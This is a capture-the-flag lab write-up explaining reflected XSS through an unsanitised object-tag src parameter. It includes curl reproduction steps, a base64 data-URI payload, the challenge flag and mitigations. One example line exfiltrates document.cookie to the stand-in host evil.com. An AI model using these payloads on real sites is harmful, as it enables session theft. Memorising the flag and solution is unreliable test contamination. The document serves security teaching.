# XSS — Object src Parameter

## Vulnerability

The `src` parameter on `?page=media` is rendered inside an `<object>` tag without sanitization, allowing HTML/JS injection via a `data:` URI — OWASP A03:2021 Injection.

## Steps to Reproduce

### 1. Observe normal behavior
```bash
curl -s "http://$VM_IP/?page=media&src=nsa" | grep '<object'
# → <object data="http://10.0.2.15/images/nsa_prism.jpg"></object>
```
The `src` parameter value gets inserted directly into `<object data="...">`.

### 2. Encode XSS payload in base64
```bash
echo -n '<script>alert("XSS")</script>' | base64
# → PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=
```

### 3. Inject via data URI
```bash
curl -s "http://$VM_IP/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4="
```

**Flag:** `928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d`

## How this works — detailed explanation

### The vulnerable code on the server (conceptually):
```php
echo '<object data="' . $_GET['src'] . '"></object>';
```

### Normal request:
```
?src=nsa
→ <object data="http://server/images/nsa_prism.jpg"></object>
→ Browser renders an image
```

### Attack request:
```
?src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=
→ <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4="></object>
→ Browser decodes base64 → <script>alert("XSS")</script> → executes JavaScript
```

### Why `<object>` is more dangerous than `<img>`

- `<img src="data:text/html;base64,...">` — browser treats it as image data, **won't execute JS**
- `<object data="data:text/html;base64,...">` — browser treats it as a full HTML document, **executes JS**

The `<object>` tag was designed to embed arbitrary content (Flash, PDFs, HTML). The browser renders whatever MIME type `data:` specifies — including `text/html` with scripts.

### Real-world attack flow

1. Attacker crafts a URL:
   ```
   http://trusted-site.com/?page=media&src=data:text/html;base64,PHNjcmlwdD5kb2N1bWVu...
   ```
   The base64 payload contains JS that steals cookies:
   ```html
   <script>document.location='https://evil.com/steal?c='+document.cookie</script>
   ```

2. Attacker sends the link to the victim (email, chat, forum post).
   The victim sees `trusted-site.com` in the URL and clicks it.

3. The victim's browser loads the page. The `<object>` tag renders the attacker's HTML/JS.
   The script runs in the context of `trusted-site.com` — it has access to that site's cookies.

4. The victim's session cookie is sent to `evil.com`. The attacker uses it to impersonate the victim.

### Why base64?

Without base64, special characters in the payload (`<`, `>`, `"`) would break the HTML or URL encoding. Base64 avoids this — the payload is a clean alphanumeric string that gets decoded by the browser at render time.

## Why It Works

The `src` parameter is reflected into the `data` attribute of an `<object>` tag with no sanitization. `data:text/html` URIs are treated as full HTML documents by browsers, enabling script execution.

## Fix / Mitigation

- Validate `src` against an allowlist of known image URLs/identifiers.
- Never reflect raw user input into HTML attributes.
- Set `Content-Security-Policy: default-src 'self'` to block `data:` URI execution.
- Use `htmlspecialchars()` to encode output before inserting into HTML attributes.
